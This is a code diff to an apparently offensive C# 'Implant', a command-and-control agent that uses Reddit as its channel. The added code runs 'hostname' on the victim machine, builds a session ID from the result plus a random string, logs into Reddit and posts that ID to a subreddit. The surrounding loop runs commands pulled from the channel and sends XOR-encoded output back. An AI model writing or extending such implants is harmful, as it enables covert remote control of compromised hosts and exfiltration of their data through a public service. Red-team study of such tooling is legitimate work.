@@ -80,9 +80,26 @@ public class Implant
         string username = "myUsername";
         string password = "myPassword";
         string subreddit = "mySubreddit";
-        string listenerID = "myListener";
         string xorkey = "myxorkey";
         //----------------------------------
+        string postText = ""; //#add sth here if you don't want to leave the post body empty
+
+        //create a session id for the agent
+        string listenerID = runTask("run hostname");
+
+        string randomString = "";
+        Random random = new Random();
+        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        for (int i = 0; i < 10; i++)
+        {
+            randomString += chars[random.Next(chars.Length)];
+        }
+
+        listenerID = listenerID + "_" + randomString;
+
+        createPost(username, password, listenerID, postText, subreddit);
+
+        Console.WriteLine("[+] Created agent session: " + listenerID);
 
         //run the implant infinite times
         while (true)
@@ -109,6 +126,16 @@ public class Implant
                 sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
             }
         }
+    }
+
+    [Obsolete]
+    static void createPost(string username, string password, string listenerID, string postText, string subreddit_name)
+    {
+        var reddit = new Reddit();
+        var user = reddit.LogIn(username, password);
+        var subreddit = reddit.GetSubreddit("/r/" + subreddit_name);
+        Console.WriteLine("Name: " + subreddit.Name);
+        subreddit.SubmitTextPost(listenerID, "");
     }
 
     static string runTask(string command)
